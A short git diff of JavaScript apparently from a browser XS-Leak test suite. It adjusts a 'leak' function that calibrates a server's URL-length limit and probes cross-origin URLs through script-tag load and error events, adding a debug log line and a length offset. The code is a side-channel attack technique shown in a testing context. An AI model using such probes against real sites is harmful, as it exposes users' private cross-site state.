@@ -1,6 +1,8 @@
 let URL_LIMIT = 10000
 
 const checkLoad = async (url) => {
+    
+    console.log(url, url.length)
     return new Promise((r, e)=>{
         let s = document.createElement('script');
         s.src = url;
@@ -65,9 +67,11 @@ const getOrigin = (url) => {
 const leak = async (url) => {
     return new Promise(async(r) => {
         // test server at / and set limit
-        let max = await calibrate(getOrigin(url))
+        let max = await calibrate(getOrigin(url) + '/testcases/tests/blank.php')
         // check url with new limit
-        let res = await checkLoad(genUrl(url, max))
+        let x = 3
+        // url will be at least x longer to trigger error
+        let res = await checkLoad(genUrl(url, max-x))
         if(res){
             return r(0)
         }
